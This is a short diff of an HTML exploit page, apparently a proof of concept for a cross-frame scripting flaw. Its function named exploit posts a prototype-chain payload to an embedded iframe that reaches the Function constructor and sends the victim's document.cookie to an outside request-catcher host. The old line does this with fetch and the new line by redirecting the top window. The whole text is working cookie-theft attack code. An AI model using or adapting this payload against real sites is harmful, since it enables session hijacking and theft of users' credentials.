@@ -7,7 +7,7 @@
       function exploit(){
     document.querySelector('iframe')
       .contentWindow
-      .postMessage(`[].__proto__.__proto__.constructor.constructor('return fetch("https://encnu1395lyv7.x.pipedream.net/?q="+document.cookie)')()`, '*');}</script>
+      .postMessage(`[].__proto__.__proto__.constructor.constructor('return top.window.location="https://encnu1395lyv7.x.pipedream.net/?q="+document.cookie')()`, '*');}</script>
   </head>
   <body>
     <div id="editor">
